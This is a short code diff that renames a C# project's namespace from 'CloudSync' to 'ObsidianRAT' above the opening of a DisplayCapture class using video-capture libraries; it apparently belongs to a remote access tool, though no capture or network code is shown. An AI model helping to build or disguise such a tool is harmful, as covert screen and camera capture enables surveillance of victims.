@@ -1,6 +1,6 @@
 ﻿using AForge.Video;
 using AForge.Video.DirectShow;
-using CloudSync.Services.Core;
+using ObsidianRAT.Services.Core;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -10,7 +10,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace CloudSync.Services.Modules
+namespace ObsidianRAT.Services.Modules
 {
     public class DisplayCapture
     {
